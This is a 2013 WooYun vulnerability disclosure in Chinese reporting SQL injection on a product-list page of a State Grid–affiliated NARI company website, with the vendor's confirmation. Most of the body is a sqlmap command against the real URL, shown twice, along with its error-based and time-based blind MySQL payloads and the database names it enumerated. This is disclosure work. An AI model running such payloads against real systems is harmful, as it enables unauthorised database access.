wybug_title: 国网电力科学研究院武汉南瑞有限责任公司SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-08-01：	细节已通知厂商并且等待厂商处理中									2013-08-02：	厂商已经确认，细节仅向厂商公开									2013-08-12：	细节向核心白帽子及相关领域专家公开									2013-08-22：	细节向普通白帽子公开									2013-09-01：	细节向实习白帽子公开									2013-09-15：	细节向公众公开  简要描述： 过滤不严，网站存在SQL注入漏洞 详细说明：  


D:\python2.7\sqlmap>sqlmap.py -u http://whnari.sgepri.sgcc.com.cn/productList.jsp?productType=O0069 --dbsPlace: GETParameter: productType    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: productType=O0068' AND (SELECT 2207 FROM(SELECT COUNT(*),CONCAT(0x3a7677673a,(SELECT (CASE WHEN (2207=2207) THEN 1 ELSE 0 END)),0x3a766e753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'otJs'='otJs    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: productType=O0068' AND SLEEP(5) AND 'JtvY'='JtvY---[11:32:48] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[11:32:48] [INFO] fetching database names[11:32:48] [INFO] the SQL query used returns 4 entries[11:32:48] [INFO] resumed: information_schema[11:32:48] [INFO] resumed: mysql[11:32:48] [INFO] resumed: nari[11:32:48] [INFO] resumed: testavailable databases [4]:[*] information_schema[*] mysql[*] nari[*] test
   漏洞证明：  
D:\python2.7\sqlmap>sqlmap.py -u http://whnari.sgepri.sgcc.com.cn/productList.jsp?productType=O0069 --dbs---Place: GETParameter: productType    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: productType=O0068' AND (SELECT 2207 FROM(SELECT COUNT(*),CONCAT(0x3a7677673a,(SELECT (CASE WHEN (2207=2207) THEN 1 ELSE 0 END)),0x3a766e753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'otJs'='otJs    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: productType=O0068' AND SLEEP(5) AND 'JtvY'='JtvY---[11:32:48] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[11:32:48] [INFO] fetching database names[11:32:48] [INFO] the SQL query used returns 4 entries[11:32:48] [INFO] resumed: information_schema[11:32:48] [INFO] resumed: mysql[11:32:48] [INFO] resumed: nari[11:32:48] [INFO] resumed: testavailable databases [4]:[*] information_schema[*] mysql[*] nari[*] test
   修复方案：  过滤、转义   版权声明：转载请注明来源 piaox@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-08-02 13:56 厂商回复： 谢谢，尽快协调整改。 最新状态： 暂无
